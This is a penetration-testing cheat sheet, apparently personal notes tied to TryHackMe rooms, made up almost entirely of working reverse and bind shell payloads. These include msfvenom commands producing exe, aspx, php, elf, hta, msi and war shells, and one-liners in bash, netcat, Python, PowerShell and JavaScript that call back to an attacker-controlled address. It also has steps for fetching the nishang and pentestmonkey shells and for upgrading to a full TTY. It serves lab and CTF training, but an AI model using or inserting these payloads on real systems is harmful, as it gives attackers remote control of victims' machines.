# Payloads



## **Reverse Shell Generator**

Great site to just add your IP and port and gives you a list of many options for shells.

{% embed url="https://www.revshells.com/" %}

## Windows

### Powershell

**Examples**

[alfred.md](../walkthroughs/tryhackme/alfred.md "mention")

**Kali**

```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 
```

Edit the file and add the following to the end of the file. This is just to make it a bit easier when we use it later.

```
Invoke-PowerShellTcp -Reverse -IPAddress $KALI -Port 4444
```

**Kali**

```
rlwrap nc -lvnp 4444
```



### EXE

**Examples**

[alfred.md](../walkthroughs/tryhackme/alfred.md "mention")

**Kali**&#x20;

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$KALI LPORT=1337 -f exe -o shell.exe
python2 -m SimpleHTTPServer 81
```



## **PHP Reverse Shell**

**Examples**

[daily-bugle.md](../walkthroughs/tryhackme/daily-bugle.md "mention")

&#x20;**Kali**&#x20;

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
```



## APSX

**Examples**

[relevant.md](../walkthroughs/tryhackme/relevant.md "mention")

**Kali #1**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.179.48  LPORT=1337 — platform windows -a x64 -f aspx -o shell.aspx
```

**Kali #2**

<pre><code><strong>rlwrap nc -lvnp 1337
</strong></code></pre>



**Python Bind Shell**

```
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",443));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

**Python Reverse Shell**

```
export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

**Bash Reverse Shells**

```
/bin/bash -i >& /dev/tcp/10.0.0.1/443 0>&1
```

## **Msfvenom Reverse Shells**

#### **Staged Payloads for Windows - x86**

```
msfvenom -p windows/shell/reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe
```

#### **Staged Payloads for Windows - x64**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x64.exe
```

#### **Stageless Payloads for Windows - x86**&#x20;

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe
```

#### **Stageless Payloads for Windows - x64**&#x20;

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$KALIPORT -f exe > shell-x64.exe
```

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=$PORT -f elf -o rshell.elf
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f asp -o rshell.asp
```

```
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$KALI -f raw -o rshell.php
```

```
msfvenom -p windows/shell_reverse_tcp LHOST= $KALI LPORT=$LPORT -f hta-psh -o rshell.hta
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f powershell
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f msi -o rshell.msi
```

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=$LPORT -f war > rshell.war
```

#### **Netcat Reverse Shells**

```
sudo nc -nv 10.10.10.10 443 -e /bin/bash
```

```
nc -nv 10.10.10.10 443 -e "/bin/bash"
```

#### **PowerShell Reverse Shell**

```
'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$KALI",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

#### **JavaScript Reverse Shell**

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, $KALI", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

#### Python Reverse Shell

```
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$KALI",1337)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])
```

#### **Upgrade to a PTY Shell**

```
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
python /tmp/shell.py
export TERM=xterm # be able to clear the screen, etc.
```

#### HTA

Under section _'An HTML Application - HTA'_

{% embed url="https://tryhackme.com/room/weaponization" %}

#### VBS

Under section _'Visual Basic for Application - VBA'_

{% embed url="https://tryhackme.com/room/weaponization" %}

## **Full TTYs**

### **Useful Links**

&#x20;[https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)

### **Spawn shells**

Go through the list one by one until something works

**Victim**

```
python -c 'import pty; pty.spawn("/bin/sh")'
python2 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
IRB: exec "/bin/sh"
vi: :!bash
vi: :set shell=/bin/bash:shell
nmap: !sh
```

**Victim**

```
ctrl + Z
stty raw -echo;fg
```

